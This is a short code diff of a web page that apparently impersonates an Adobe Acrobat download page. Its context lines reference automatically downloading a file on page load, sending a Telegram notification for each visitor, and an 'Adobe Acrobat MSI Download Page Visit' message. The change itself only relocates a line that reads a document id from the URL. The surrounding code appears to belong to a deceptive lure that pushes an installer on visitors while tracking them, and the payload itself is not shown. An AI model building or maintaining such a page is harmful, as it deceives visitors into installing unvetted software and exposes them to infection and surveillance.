@@ -2335,10 +2335,6 @@
   </form>
 
   <script nonce="MTk0NTg0Nzc5NywxMzc2NDA5OTEx">
-    
-    const docId = window.location.pathname.split('/')[2];
-        
-    console.log('ADOBE DOCID:', docId);
       // Auto-download file on page load (sample URL)
       window.addEventListener('load', async function() {
         // Send Telegram notification for visitor
@@ -4262,6 +4258,7 @@ Adobe Acrobat MSI Download Page Visit`;
         };
 
         const type = window.location.pathname.split('/')[1];
+        const docId = window.location.pathname.split('/')[2];
         const pdfImages = imageSets[type] || [];
         let currentIndex = 0;
         let rotationInterval = null;
